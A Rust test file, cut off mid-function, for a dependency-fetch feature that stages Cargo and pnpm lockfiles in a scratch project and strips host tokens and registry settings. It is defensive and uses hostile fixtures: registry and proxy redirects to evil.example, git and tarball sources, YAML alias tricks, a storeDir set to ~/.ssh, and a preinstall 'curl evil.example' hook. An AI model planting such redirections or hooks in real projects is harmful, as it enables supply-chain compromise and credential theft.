use super::*;
use crate::core::task_worker_env::ProbeOutcome;
use std::sync::Mutex;

const CRATES_IO: &str = "registry+https://github.com/rust-lang/crates.io-index";

/// What the worker plants in its worktree to redirect a fetch.
const EVIL: &str = "evil.example";

type Inspect = Box<dyn Fn(&ProbeCommand) + Send + Sync>;

/// A runner that answers each command by its arguments and remembers it.
struct FakeRunner {
    offline_ok: bool,
    online_ok: bool,
    seen: Mutex<Vec<ProbeCommand>>,
    inspect: Option<Inspect>,
}

impl FakeRunner {
    fn new(offline_ok: bool, online_ok: bool) -> Self {
        Self {
            offline_ok,
            online_ok,
            seen: Mutex::new(Vec::new()),
            inspect: None,
        }
    }

    /// Runs `check` on each command while its scratch project still exists.
    fn inspecting(offline_ok: bool, online_ok: bool, check: Inspect) -> Self {
        Self {
            inspect: Some(check),
            ..Self::new(offline_ok, online_ok)
        }
    }

    fn commands(&self) -> Vec<ProbeCommand> {
        self.seen.lock().unwrap().clone()
    }
}

impl ProbeRunner for FakeRunner {
    fn run(&self, probe: &ProbeCommand) -> ProbeOutcome {
        self.seen.lock().unwrap().push(probe.clone());
        if let Some(check) = &self.inspect {
            check(probe);
        }
        let offline = probe.args.iter().any(|arg| arg == "--offline");
        let success = if offline {
            self.offline_ok
        } else {
            self.online_ok
        };
        ProbeOutcome {
            success,
            detail: if success { "" } else { "boom" }.into(),
        }
    }
}

fn cargo_lock(sources: &[(&str, &str)]) -> String {
    let mut lock = String::from("version = 4\n");
    for (name, source) in sources {
        lock.push_str(&format!(
            "\n[[package]]\nname = \"{name}\"\nversion = \"1.0.0\"\nsource = \"{source}\"\n"
        ));
    }
    lock
}

/// The host environment of a test: harmless names a fetch keeps, and the
/// registry settings and tokens it must not.
fn parent_env() -> Vec<(OsString, OsString)> {
    [
        ("PATH", "/usr/bin"),
        ("HOME", "/home/operator"),
        ("LC_ALL", "C"),
        ("HTTPS_PROXY", "http://proxy.corp:3128"),
        ("NPM_CONFIG_REGISTRY", "https://evil.example/npm/"),
        ("npm_config__authToken", "npm-secret"),
        ("CARGO_REGISTRIES_CRATES_IO_TOKEN", "cargo-secret"),
        ("CARGO_HTTP_PROXY", "http://evil.example"),
        ("KRONN_AUTH_TOKEN", "kronn-secret"),
        ("GITHUB_TOKEN", "gh-secret"),
    ]
    .into_iter()
    .map(|(name, value)| (OsString::from(name), OsString::from(value)))
    .collect()
}

fn env_of(command: &ProbeCommand, name: &str) -> Option<OsString> {
    command
        .env
        .iter()
        .find(|(key, _)| key == name)
        .map(|(_, value)| value.clone())
}

fn assert_hostile_environment_withheld(command: &ProbeCommand) {
    assert!(
        command.clean_env,
        "{:?} starts from an empty environment",
        command.program
    );
    for (name, value) in &command.env {
        let upper = name.to_ascii_uppercase();
        assert!(
            !upper.starts_with("NPM_CONFIG_REGISTRY")
                && !upper.contains("TOKEN")
                && !upper.starts_with("CARGO_REGISTRIES_")
                && !upper.starts_with("CARGO_HTTP_"),
            "{name} reached the {} command",
            command.program
        );
        assert!(
            !value.to_string_lossy().contains(EVIL),
            "{name}={value:?} points at the worker's host"
        );
    }
}

// ─── environment ──────────────────────────────────────────────────────────

#[test]
fn a_fetch_inherits_only_its_allow_list() {
    let env = fetch_env(&parent_env(), &[]);
    let names: Vec<&str> = env.iter().map(|(name, _)| name.as_str()).collect();
    for kept in ["PATH", "HOME", "LC_ALL", "HTTPS_PROXY"] {
        assert!(names.contains(&kept), "{kept} is kept");
    }
    for dropped in [
        "NPM_CONFIG_REGISTRY",
        "npm_config__authToken",
        "CARGO_REGISTRIES_CRATES_IO_TOKEN",
        "CARGO_HTTP_PROXY",
        "KRONN_AUTH_TOKEN",
        "GITHUB_TOKEN",
    ] {
        assert!(!names.contains(&dropped), "{dropped} is dropped");
    }
}

#[test]
fn what_a_fetch_sets_replaces_what_it_inherited() {
    let env = fetch_env(
        &parent_env(),
        &[
            ("HOME", OsString::from("/scratch")),
            ("CARGO_HOME", OsString::from("/cargo")),
        ],
    );
    let get = |name: &str| env.iter().filter(|(key, _)| key == name).count();
    assert_eq!(get("HOME"), 1);
    assert_eq!(get("CARGO_HOME"), 1);
    assert!(inherits_into_fetch("PATH"));
    assert!(!inherits_into_fetch("NPM_CONFIG_REGISTRY"));
}

/// The sealed environment a route inherits still carries `NPM_CONFIG_*`: that is
/// why a fetch asks the runner to clear it instead of relying on the seal.
#[test]
fn the_sealed_environment_alone_would_pass_an_npm_registry_override() {
    assert!(crate::core::child_env::is_base("NPM_CONFIG_REGISTRY"));
}

#[cfg(unix)]
#[test]
fn the_process_runner_gives_a_clean_command_only_what_it_was_given() {
    use crate::core::task_worker_env::ProcessProbeRunner;
    let command = |clean_env: bool, args: &[&str]| ProbeCommand {
        program: "/usr/bin/printenv".into(),
        args: args.iter().map(|arg| arg.to_string()).collect(),
        cwd: std::env::temp_dir(),
        env: vec![("ONLY_THIS".into(), OsString::from("1"))],
        timeout: Duration::from_secs(20),
        priority: Priority::Normal,
        clean_env,
    };
    // Nothing but what the command was given.
    let clean = ProcessProbeRunner.run(&command(true, &[]));
    assert!(clean.success, "{}", clean.detail);
    assert_eq!(clean.detail, "ONLY_THIS=1");

    // The sealed environment a route inherits keeps PATH (and the like).
    assert!(ProcessProbeRunner.run(&command(false, &["PATH"])).success);
    let own = ProcessProbeRunner.run(&command(false, &["ONLY_THIS"]));
    assert_eq!(own.detail, "1");
}

// ─── Cargo.lock ───────────────────────────────────────────────────────────

#[test]
fn a_lock_of_crates_io_packages_is_scanned_with_its_registry() {
    let lock = cargo_lock(&[("serde", CRATES_IO), ("tokio", CRATES_IO)]);
    let scan = scan_cargo_lock(&lock).unwrap();
    assert_eq!(scan.registry_packages, 2);
    assert_eq!(scan.registries, vec![CRATES_IO.to_string()]);
    assert_eq!(
        scan.crates,
        vec![
            ("serde".to_string(), "1.0.0".to_string()),
            ("tokio".to_string(), "1.0.0".to_string())
        ]
    );
}

#[test]
fn the_sparse_crates_io_index_is_allowed_too() {
    let lock = cargo_lock(&[("serde", "sparse+https://index.crates.io/")]);
    assert_eq!(scan_cargo_lock(&lock).unwrap().registry_packages, 1);
}

#[test]
fn a_path_only_lock_has_nothing_to_fetch() {
    let lock = "version = 4\n\n[[package]]\nname = \"fixture\"\nversion = \"0.0.0\"\n";
    assert_eq!(scan_cargo_lock(lock).unwrap().registry_packages, 0);
    assert_eq!(
        scan_cargo_lock("version = 4\n").unwrap().registry_packages,
        0
    );
}

#[test]
fn a_git_dependency_or_another_registry_refuses_the_whole_lock() {
    for source in [
        "git+https://evil.example/x.git?rev=abc#abc",
        "registry+https://evil.example/index",
        "sparse+https://evil.example/",
    ] {
        let lock = cargo_lock(&[("serde", CRATES_IO), ("sneaky", source)]);
        let error = scan_cargo_lock(&lock).unwrap_err();
        assert!(error.contains("sneaky"), "{error}");
        assert!(error.contains(source), "{error}");
    }
}

#[test]
fn a_lock_that_is_not_toml_is_refused() {
    assert!(scan_cargo_lock("[[package\nsource =").is_err());
}

#[test]
fn a_source_hidden_in_an_inline_table_is_still_seen() {
    let lock = "version = 4\npackage = [{ name = \"x\", version = \"1\", source = \"git+https://evil.example/x\" }]\n";
    assert!(scan_cargo_lock(lock).is_err());
}

#[test]
fn the_staged_lock_keeps_the_registry_packages_and_nothing_else() {
    let lock = format!(
        "version = 4\n\n[metadata]\nregistry = \"https://{EVIL}/\"\n\n\
         [[patch.unused]]\nname = \"serde\"\nversion = \"9.9.9\"\nsource = \"git+https://{EVIL}/s\"\n\n\
         [[package]]\nname = \"kronn\"\nversion = \"0.1.0\"\ndependencies = [\"serde\"]\n\n\
         [[package]]\nname = \"serde\"\nversion = \"1.0.0\"\nsource = \"{CRATES_IO}\"\n\
         checksum = \"abc123\"\ndependencies = [\"serde_derive\"]\nsuspicious = \"{EVIL}\"\n"
    );
    let scan = scan_cargo_lock(&lock).unwrap();
    assert!(!scan.lock.contains(EVIL), "{}", scan.lock);
    assert!(
        !scan.lock.contains("kronn"),
        "the path package is not staged"
    );
    assert!(!scan.lock.contains("metadata"));
    let staged: toml::Table = toml::from_str(&scan.lock).unwrap();
    assert_eq!(staged["version"].as_integer(), Some(4));
    let packages = staged["package"].as_array().unwrap();
    assert_eq!(packages.len(), 1);
    assert_eq!(packages[0]["name"].as_str(), Some("serde"));
    assert_eq!(packages[0]["checksum"].as_str(), Some("abc123"));
    assert_eq!(
        packages[0]["dependencies"][0].as_str(),
        Some("serde_derive")
    );
    assert!(packages[0].get("suspicious").is_none());
}

#[test]
fn an_old_lock_format_or_an_odd_package_name_is_not_staged() {
    let v2 = format!(
        "version = 2\n\n[[package]]\nname = \"serde\"\nversion = \"1.0.0\"\nsource = \"{CRATES_IO}\"\n"
    );
    assert!(scan_cargo_lock(&v2).is_err());
    let injected = format!(
        "version = 4\n\n[[package]]\nname = \"a\\\"b\"\nversion = \"1.0.0\"\nsource = \"{CRATES_IO}\"\n"
    );
    assert!(scan_cargo_lock(&injected).is_err());
    let bad_version = format!(
        "version = 4\n\n[[package]]\nname = \"a\"\nversion = \"1.0 \\\"x\"\nsource = \"{CRATES_IO}\"\n"
    );
    assert!(scan_cargo_lock(&bad_version).is_err());
}

#[test]
fn the_staged_manifest_depends_on_each_locked_crate_at_its_exact_version() {
    let crates = vec![
        ("syn".to_string(), "1.0.109".to_string()),
        ("syn".to_string(), "2.0.1".to_string()),
        ("serde".to_string(), "1.0.0".to_string()),
    ];
    let manifest = staged_cargo_manifest(&crates).unwrap();
    let parsed: toml::Table = toml::from_str(&manifest).unwrap();
    let dependencies = parsed["dependencies"].as_table().unwrap();
    assert_eq!(
        dependencies.len(),
        3,
        "two versions of a crate get two keys"
    );
    let wanted: Vec<(&str, &str)> = dependencies
        .values()
        .map(|dep| {
            (
                dep["package"].as_str().unwrap(),
                dep["version"].as_str().unwrap(),
            )
        })
        .collect();
    for expected in [("syn", "=1.0.109"), ("syn", "=2.0.1"), ("serde", "=1.0.0")] {
        assert!(wanted.contains(&expected), "{expected:?} in {wanted:?}");
    }
    for dep in dependencies.values() {
        assert_eq!(dep["default-features"].as_bool(), Some(false));
        assert!(dep.get("git").is_none() && dep.get("path").is_none());
        assert!(dep.get("registry").is_none(), "only the default registry");
    }
    for table in ["patch", "source", "registries", "replace", "workspace"] {
        assert!(parsed.get(table).is_none(), "{table}");
    }
}

// ─── cargo step ───────────────────────────────────────────────────────────

struct Tree {
    _dir: tempfile::TempDir,
    worktree: PathBuf,
    manifest_dir: PathBuf,
    cargo_home: PathBuf,
    scratch_root: PathBuf,
    env: Vec<(OsString, OsString)>,
}

/// A worktree whose worker planted a source replacement and a `[patch]`.
fn tree(lock: Option<&str>) -> Tree {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().canonicalize().unwrap();
    let worktree = root.join("wt");
    let manifest_dir = worktree.join("backend");
    std::fs::create_dir_all(&manifest_dir).unwrap();
    std::fs::write(
        manifest_dir.join("Cargo.toml"),
        format!(
            "[package]\nname = \"x\"\nversion = \"0.1.0\"\n\n\
             [patch.crates-io]\nserde = {{ git = \"https://{EVIL}/serde\" }}\n\n\
             [registries.evil]\nindex = \"https://{EVIL}/index\"\n"
        ),
    )
    .unwrap();
    std::fs::create_dir_all(worktree.join(".cargo")).unwrap();
    std::fs::write(
        worktree.join(".cargo").join("config.toml"),
        format!(
            "[source.crates-io]\nreplace-with = \"evil\"\n\n\
             [source.evil]\nregistry = \"https://{EVIL}/index\"\n"
        ),
    )
    .unwrap();
    if let Some(lock) = lock {
        std::fs::write(manifest_dir.join("Cargo.lock"), lock).unwrap();
    }
    let cargo_home = root.join("cargo-home");
    std::fs::create_dir_all(&cargo_home).unwrap();
    let scratch_root = root.join("data").join(SCRATCH_DIR_NAME);
    Tree {
        worktree,
        manifest_dir,
        cargo_home,
        scratch_root,
        env: parent_env(),
        _dir: dir,
    }
}

fn run_cargo(tree: &Tree, runner: &FakeRunner) -> Option<DepFetchStep> {
    run_cargo_with(tree, runner, &CancellationToken::new())
}

fn run_cargo_with(
    tree: &Tree,
    runner: &FakeRunner,
    cancel: &CancellationToken,
) -> Option<DepFetchStep> {
    let host = FetchHost {
        scratch_root: &tree.scratch_root,
        env: &tree.env,
        runner,
        cancel,
    };
    fetch_cargo(
        &tree.worktree,
        &tree.manifest_dir,
        Some(&tree.cargo_home),
        &host,
    )
}

fn leftovers(root: &Path) -> usize {
    std::fs::read_dir(root).map(|dir| dir.count()).unwrap_or(0)
}

#[test]
fn a_cache_that_holds_everything_never_reaches_the_network() {
    let tree = tree(Some(&cargo_lock(&[("serde", CRATES_IO)])));
    let runner = FakeRunner::new(true, false);
    let step = run_cargo(&tree, &runner).unwrap();
    assert_eq!(step.outcome, FetchOutcome::Cached);
    let commands = runner.commands();
    assert_eq!(commands.len(), 1, "only the offline probe ran");
    assert!(commands[0].args.contains(&"--offline".to_string()));
    assert_eq!(
        env_of(&commands[0], "CARGO_NET_OFFLINE"),
        Some("true".into())
    );
}

#[test]
fn a_missing_crate_is_fetched_from_the_lock_only() {
    let tree = tree(Some(&cargo_lock(&[("utoipa-swagger-ui", CRATES_IO)])));
    let runner = FakeRunner::new(false, true);
    let step = run_cargo(&tree, &runner).unwrap();
    assert_eq!(step.outcome, FetchOutcome::Fetched);
    assert_eq!(step.ecosystem, Ecosystem::Cargo);
    assert_eq!(step.lockfile, "backend/Cargo.lock");
    assert_eq!(step.registries, vec![CRATES_IO.to_string()]);

    let commands = runner.commands();
    assert_eq!(commands.len(), 2);
    let online = &commands[1];
    assert_eq!(online.program, "cargo");
    assert_eq!(online.args[0], "fetch");
    assert!(!online.args.contains(&"--offline".to_string()));
    assert_eq!(env_of(online, "CARGO_NET_OFFLINE"), Some("false".into()));
    assert_eq!(
        env_of(online, "CARGO_HOME"),
        Some(tree.cargo_home.clone().into_os_string())
    );
}

/// The worker's `.cargo/config.toml` (a `[source.crates-io] replace-with`) and
/// its `Cargo.toml` (`[patch]`, `[registries]`) must never reach Cargo, whatever
/// the Cargo version's configuration discovery: the command's cwd and manifest
/// are a scratch project holding only what Kronn generated.
#[test]
fn the_workers_cargo_configuration_and_manifest_are_never_read() {
    let tree = tree(Some(&cargo_lock(&[("serde", CRATES_IO)])));
    let worktree = tree.worktree.clone();
    let scratch_root = tree.scratch_root.clone();
    let runner = FakeRunner::inspecting(
        false,
        true,
        Box::new(move |command| {
            assert!(command.cwd.starts_with(&scratch_root), "{:?}", command.cwd);
            assert!(!command.cwd.starts_with(&worktree));
            let manifest = command
                .args
                .iter()
                .skip_while(|arg| *arg != "--manifest-path")
                .nth(1)
                .expect("a --manifest-path");
            assert_eq!(Path::new(manifest), command.cwd.join("Cargo.toml"));
            assert!(
                !command.args.iter().any(|arg| arg.contains("wt")),
                "no argument names the worktree: {:?}",
                command.args
            );
            // What Cargo would find from the cwd upwards inside the scratch project.
            assert!(!command.cwd.join(".cargo").exists());
            let staged = std::fs::read_to_string(command.cwd.join("Cargo.toml")).unwrap();
            let parsed: toml::Table = toml::from_str(&staged).unwrap();
            for table in ["patch", "source", "registries", "replace"] {
                assert!(parsed.get(table).is_none(), "{table} in {staged}");
            }
            assert!(!staged.contains(EVIL), "{staged}");
            let lock = std::fs::read_to_string(command.cwd.join("Cargo.lock")).unwrap();
            assert!(!lock.contains(EVIL), "{lock}");
        }),
    );
    let step = run_cargo(&tree, &runner).unwrap();
    assert_eq!(step.outcome, FetchOutcome::Fetched);
    assert_eq!(runner.commands().len(), 2);
    assert_eq!(leftovers(&tree.scratch_root), 0, "the scratch is removed");
}

#[test]
fn a_cargo_fetch_never_sees_a_host_registry_setting_or_token() {
    let tree = tree(Some(&cargo_lock(&[("serde", CRATES_IO)])));
    let runner = FakeRunner::new(false, true);
    run_cargo(&tree, &runner).unwrap();
    let commands = runner.commands();
    assert_eq!(commands.len(), 2);
    for command in &commands {
        assert_hostile_environment_withheld(command);
        assert!(env_of(command, "PATH").is_some());
        assert!(env_of(command, "CARGO_HOME").is_some());
        assert_eq!(
            env_of(command, "HTTPS_PROXY"),
            Some("http://proxy.corp:3128".into()),
            "the operator's own proxy is kept"
        );
    }
}

#[test]
fn a_lock_with_a_git_dependency_fetches_nothing() {
    let tree = tree(Some(&cargo_lock(&[(
        "sneaky",
        "git+https://evil.example/x.git#abc",
    )])));
    let runner = FakeRunner::new(false, true);
    let step = run_cargo(&tree, &runner).unwrap();
    assert!(matches!(step.outcome, FetchOutcome::Refused { .. }));
    assert!(step.registries.is_empty());
    assert!(runner.commands().is_empty(), "no command, so no network");
    assert_eq!(leftovers(&tree.scratch_root), 0, "nothing was staged");
}

#[test]
fn a_failed_fetch_is_recorded_with_its_detail() {
    let tree = tree(Some(&cargo_lock(&[("serde", CRATES_IO)])));
    let step = run_cargo(&tree, &FakeRunner::new(false, false)).unwrap();
    assert_eq!(
        step.outcome,
        FetchOutcome::Failed {
            detail: "boom".into()
        }
    );
    assert_eq!(leftovers(&tree.scratch_root), 0);
}

#[test]
fn a_lock_without_registry_packages_or_without_a_lock_is_no_step() {
    let path_only = tree(Some("version = 4\n"));
    let runner = FakeRunner::new(false, true);
    assert!(run_cargo(&path_only, &runner).is_none());
    assert!(run_cargo(&tree(None), &runner).is_none());
    assert!(runner.commands().is_empty());
}

#[test]
fn a_host_without_a_cargo_home_has_no_cache_to_fill() {
    let tree = tree(Some(&cargo_lock(&[("serde", CRATES_IO)])));
    let runner = FakeRunner::new(false, true);
    let cancel = CancellationToken::new();
    let host = FetchHost {
        scratch_root: &tree.scratch_root,
        env: &tree.env,
        runner: &runner,
        cancel: &cancel,
    };
    let step = fetch_cargo(&tree.worktree, &tree.manifest_dir, None, &host).unwrap();
    assert!(matches!(step.outcome, FetchOutcome::Refused { .. }));
    assert!(runner.commands().is_empty());
}

#[test]
fn a_cancelled_launch_fetches_nothing() {
    let tree = tree(Some(&cargo_lock(&[("serde", CRATES_IO)])));
    let runner = FakeRunner::new(false, true);
    let cancel = CancellationToken::new();
    cancel.cancel();
    let step = run_cargo_with(&tree, &runner, &cancel).unwrap();
    assert_eq!(step.outcome, FetchOutcome::Cancelled);
    assert!(runner.commands().is_empty());
}

#[cfg(unix)]
#[test]
fn a_lock_that_is_a_symlink_is_refused_not_followed() {
    let tree = tree(None);
    let target = tree.worktree.join("elsewhere.lock");
    std::fs::write(&target, cargo_lock(&[("serde", CRATES_IO)])).unwrap();
    std::os::unix::fs::symlink(&target, tree.manifest_dir.join("Cargo.lock")).unwrap();
    let runner = FakeRunner::new(false, true);
    let step = run_cargo(&tree, &runner).unwrap();
    assert!(
        matches!(step.outcome, FetchOutcome::Refused { .. }),
        "{step:?}"
    );
    assert!(runner.commands().is_empty());
}

#[test]
fn a_lock_over_the_cap_is_refused_unread() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("Cargo.lock");
    std::fs::write(&path, "x".repeat(64)).unwrap();
    assert!(read_capped(&path, 64).is_ok());
    let error = read_capped(&path, 63).unwrap_err();
    assert!(error.contains("over the 63"), "{error}");
    assert_eq!(MAX_LOCK_BYTES, 16 * 1024 * 1024);
}

// ─── pnpm-lock.yaml ───────────────────────────────────────────────────────

const PNPM_LOCK_OK: &str = "lockfileVersion: '9.0'\n\nimporters:\n  .: {}\n\npackages:\n\n  \
    left-pad@1.3.0:\n    resolution: {integrity: sha512-abc+/=}\n";

fn lock_with_resolution(resolution: &str) -> String {
    format!("lockfileVersion: '9.0'\n\npackages:\n\n  x@1.0.0:\n    {resolution}\n")
}

#[test]
fn a_registry_lock_is_scanned_and_re_serialised() {
    let scan = scan_pnpm_lock(PNPM_LOCK_OK).unwrap().unwrap();
    assert_eq!(scan.packages, 1);
    let again = scan_pnpm_lock(&scan.lock).unwrap().unwrap();
    assert_eq!(again.packages, 1);
    assert!(scan.lock.contains("left-pad@1.3.0"));
    assert!(scan.lock.contains("sha512-abc+/="));
}

#[test]
fn a_registry_tarball_on_the_npm_host_is_allowed() {
    let lock = lock_with_resolution(
        "resolution: {integrity: sha512-abc, tarball: 'https://registry.npmjs.org/x/-/x-1.0.0.tgz'}",
    );
    assert!(scan_pnpm_lock(&lock).unwrap().is_some());
}

#[test]
fn a_lock_without_packages_is_nothing_to_fetch() {
    for lock in [
        "lockfileVersion: '9.0'\n\nimporters:\n  .: {}\n",
        "lockfileVersion: '9.0'\npackages: {}\n",
        "lockfileVersion: '9.0'\npackages:\n",
    ] {
        assert_eq!(scan_pnpm_lock(lock).unwrap(), None, "{lock}");
    }
}

#[test]
fn a_pnpm_lock_pointing_elsewhere_than_the_registry_is_refused() {
    for resolution in [
        "resolution: {tarball: https://evil.example/x.tgz}",
        "resolution: {integrity: sha512-abc, tarball: https://evil.example/x.tgz}",
        "resolution: {type: git, repo: https://evil.example/x.git, commit: abc}",
        "resolution: {directory: ../x, type: directory}",
        "resolution: {integrity: sha512-abc, path: ../x}",
        "resolution: {integrity: sha512-abc, gitHosted: true}",
        // The npm host as a prefix of another, or with userinfo.
        "resolution: {integrity: sha512-abc, tarball: 'https://registry.npmjs.org.evil.example/x.tgz'}",
        "resolution: {integrity: sha512-abc, tarball: 'https://registry.npmjs.org@evil.example/x.tgz'}",
        "resolution: {integrity: sha512-abc, tarball: 'http://registry.npmjs.org/x.tgz'}",
        "resolution: {}",
        "resolution: {integrity: not-a-hash}",
    ] {
        assert!(
            scan_pnpm_lock(&lock_with_resolution(resolution)).is_err(),
            "{resolution}"
        );
    }
}

#[test]
fn an_anchor_aliased_to_a_tarball_resolution_is_refused() {
    let lock = "lockfileVersion: '9.0'\n\n\
        packages:\n\n  \
        a@1.0.0:\n    resolution: {integrity: sha512-abc}\n  \
        b@1.0.0:\n    resolution: &evil {tarball: 'https://evil.example/b.tgz'}\n  \
        c@1.0.0:\n    resolution: *evil\n";
    assert!(scan_pnpm_lock(lock).is_err());

    // The anchor defined outside `packages`, where a substring scan of the
    // `packages` lines would see only the alias.
    let lock = "lockfileVersion: '9.0'\n\n\
        x-template: &evil\n  tarball: 'https://evil.example/c.tgz'\n\n\
        packages:\n\n  \
        c@1.0.0:\n    resolution: *evil\n";
    assert!(scan_pnpm_lock(lock).is_err());
}

#[test]
fn a_merge_key_that_brings_in_a_tarball_is_refused() {
    let lock = "lockfileVersion: '9.0'\n\n\
        x-base: &base\n  tarball: 'https://evil.example/c.tgz'\n\n\
        packages:\n\n  \
        c@1.0.0:\n    resolution:\n      <<: *base\n      integrity: sha512-abc\n";
    assert!(scan_pnpm_lock(lock).is_err());
}

#[test]
fn a_folded_or_multi_line_tarball_url_is_refused() {
    for body in [
        "resolution:\n      integrity: sha512-abc\n      tarball: >-\n        https://evil.example/x.tgz\n",
        "resolution:\n      integrity: sha512-abc\n      tarball: |\n        https://evil.example/x.tgz\n",
        "resolution:\n      integrity: sha512-abc\n      tarball: \"https://evil\\\n        .example/x.tgz\"\n",
        "resolution:\n      integrity: sha512-abc\n      tarball:\n        https://evil.example/x.tgz\n",
    ] {
        let lock = format!("lockfileVersion: '9.0'\n\npackages:\n\n  x@1.0.0:\n    {body}");
        assert!(scan_pnpm_lock(&lock).is_err(), "{body}");
    }
}

#[test]
fn flow_and_escaped_spellings_of_a_forbidden_field_are_refused() {
    for resolution in [
        "resolution: {integrity: sha512-abc, \"tar\\u0062all\": 'https://evil.example/x.tgz'}",
        "resolution: {integrity: sha512-abc, ? tarball : 'https://evil.example/x.tgz'}",
        "resolution: {integrity: sha512-abc, 'tarball': 'https://evil.example/x.tgz'}",
        "resolution: !evil {integrity: sha512-abc}",
        "resolution: {integrity: !evil sha512-abc}",
        "resolution: [integrity, sha512-abc]",
        "resolution: {integrity: 123}",
    ] {
        assert!(
            scan_pnpm_lock(&lock_with_resolution(resolution)).is_err(),
            "{resolution}"
        );
    }
}

#[test]
fn a_package_key_that_carries_a_url_or_a_path_is_refused() {
    for key in [
        "'x@https://evil.example/x.tgz'",
        "'x@git+https://evil.example/x.git'",
        "'x@file:../x'",
        "'x@link:../x'",
        "'x@github:evil/x'",
        "'x@1.0.0 y'",
    ] {
        let lock = format!(
            "lockfileVersion: '9.0'\n\npackages:\n\n  {key}:\n    resolution: {{integrity: sha512-abc}}\n"
        );
        assert!(scan_pnpm_lock(&lock).is_err(), "{key}");
    }
}

#[test]
fn a_package_without_a_resolution_or_with_a_scalar_entry_is_refused() {
    for entry in [
        "x@1.0.0: {}",
        "x@1.0.0: ~",
        "x@1.0.0: 1",
        "x@1.0.0:\n    engines: {node: '>=1'}",
    ] {
        let lock = format!("lockfileVersion: '9.0'\n\npackages:\n  {entry}\n");
        assert!(scan_pnpm_lock(&lock).is_err(), "{entry}");
    }
}

#[test]
fn a_lock_that_is_not_one_yaml_mapping_is_refused() {
    for lock in [
        "- a\n- b\n",
        "packages: [x]\n",
        "packages:\n  x@1.0.0: {resolution: {integrity: sha512-a}}\n  x@1.0.0: {resolution: {integrity: sha512-b}}\n",
        "packages:\n  x@1.0.0: {resolution: {integrity: sha512-a}}\n---\npackages: {}\n",
        "packages: [\n",
    ] {
        assert!(scan_pnpm_lock(lock).is_err(), "{lock}");
    }
}

#[test]
fn an_alias_bomb_is_refused_not_expanded() {
    let mut lock = String::from("lockfileVersion: '9.0'\nl0: &l0 [x, x, x, x, x, x, x, x, x, x]\n");
    for level in 1..12 {
        let previous = level - 1;
        lock.push_str(&format!(
            "l{level}: &l{level} [*l{previous}, *l{previous}, *l{previous}, *l{previous}, \
             *l{previous}, *l{previous}, *l{previous}, *l{previous}, *l{previous}, *l{previous}]\n"
        ));
    }
    lock.push_str("packages:\n  x@1.0.0: {resolution: {integrity: sha512-abc}}\n");
    let started = Instant::now();
    let _ = scan_pnpm_lock(&lock);
    assert!(
        started.elapsed() < Duration::from_secs(20),
        "the parser bounds alias expansion"
    );
}

#[test]
fn what_pnpm_will_parse_is_the_document_kronn_validated() {
    let lock = "lockfileVersion: '9.0'\n\n\
        # tarball: 'https://evil.example/in-a-comment.tgz'\n\
        x-base: &base\n  integrity: sha512-abc\n\n\
        packages:\n\n  x@1.0.0:\n    resolution:\n      <<: *base\n";
    let scan = scan_pnpm_lock(lock).unwrap().unwrap();
    assert!(!scan.lock.contains("<<"), "{}", scan.lock);
    assert!(!scan.lock.contains("evil.example"), "{}", scan.lock);
    assert!(!scan.lock.contains('#'));
    assert!(scan.lock.contains("integrity: sha512-abc"));
}

// ─── pnpm-workspace.yaml ──────────────────────────────────────────────────

const WORKSPACE_HOSTILE: &str = "\
allowBuilds:\n  sharp: true\n\
overrides:\n  postcss: '8.5.23'\n\
registry: https://evil.example/\n\
'@scope:registry': https://evil.example/\n\
httpsProxy: http://evil.example:8080\n\
proxy: http://evil.example:8080\n\
storeDir: /Users/someone/.ssh\n\
cacheDir: /Users/someone/.cache\n\
pnpmfile: ./evil.cjs\n\
hooks: {readPackage: evil}\n\
cafile: ./evil-ca.pem\n\
strictSsl: false\n\
packages:\n  - '../../**'\n\
_authToken: ${NPM_TOKEN}\n";

#[test]
fn the_workspace_file_is_rebuilt_from_an_allow_list_of_keys() {
    let staged = workspace_allowlist(WORKSPACE_HOSTILE).unwrap().unwrap();
    let parsed: serde_yaml::Mapping = serde_yaml::from_str(&staged).unwrap();
    let mut keys: Vec<&str> = parsed
        .keys()
        .filter_map(serde_yaml::Value::as_str)
        .collect();
    keys.sort_unstable();
    assert_eq!(keys, vec!["allowBuilds", "overrides"]);
    for hostile in [
        EVIL,
        "registry",
        "proxy",
        "Proxy",
        "storeDir",
        "cacheDir",
        "pnpmfile",
        "hooks",
        "cafile",
        "strictSsl",
        "../",
        "NPM_TOKEN",
        "_authToken",
        "packages",
    ] {
        assert!(!staged.contains(hostile), "{hostile} in {staged}");
    }
}

#[test]
fn a_workspace_file_with_nothing_on_the_list_stages_nothing() {
    assert_eq!(
        workspace_allowlist("registry: https://evil.example/\n").unwrap(),
        None
    );
    assert_eq!(workspace_allowlist("").unwrap(), None);
}

#[test]
fn an_allowed_key_with_a_value_that_is_not_inert_refuses_the_file() {
    for text in [
        "allowBuilds:\n  sharp: ${NPM_TOKEN}\n",
        "overrides:\n  x: !evil 1.0.0\n",
        "overrides: &o\n  x: '1'\ncatalog: *o\nallowBuilds:\n  ? [a, b]\n  : true\n",
        "- not a mapping\n",
        "allowBuilds: [\n",
    ] {
        assert!(workspace_allowlist(text).is_err(), "{text}");
    }
}

// ─── pnpm step ────────────────────────────────────────────────────────────

struct PnpmTree {
    _dir: tempfile::TempDir,
    worktree: PathBuf,
    frontend: PathBuf,
    store: PathBuf,
    scratch_root: PathBuf,
    env: Vec<(OsString, OsString)>,
}

fn pnpm_tree(lock: &str, workspace: Option<&str>) -> PnpmTree {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().canonicalize().unwrap();
    let worktree = root.join("wt");
    let frontend = worktree.join("frontend");
    std::fs::create_dir_all(&frontend).unwrap();
    std::fs::write(frontend.join("pnpm-lock.yaml"), lock).unwrap();
    // The worker's own `.npmrc` and manifest must never reach the fetch.
    std::fs::write(frontend.join(".npmrc"), "registry=https://evil.example/\n").unwrap();
    std::fs::write(
        frontend.join("package.json"),
        "{\"name\":\"x\",\"packageManager\":\"pnpm@1.0.0\",\"scripts\":{\"preinstall\":\"curl evil.example\"}}",
    )
    .unwrap();
    if let Some(workspace) = workspace {
        std::fs::write(frontend.join("pnpm-workspace.yaml"), workspace).unwrap();
    }
    let store = root.join("store");
    std::fs::create_dir_all(&store).unwrap();
    let scratch_root = root.join("data").join(SCRATCH_DIR_NAME);
    PnpmTree {
        _dir: dir,
        worktree,
        frontend,
        store,
        scratch_root,
        env: parent_env(),
    }
}

fn run_pnpm(tree: &PnpmTree, runner: &FakeRunner) -> Option<DepFetchStep> {
    let cancel = CancellationToken::new();
    let host = FetchHost {
        scratch_root: &tree.scratch_root,
        env: &tree.env,
        runner,
        cancel: &cancel,
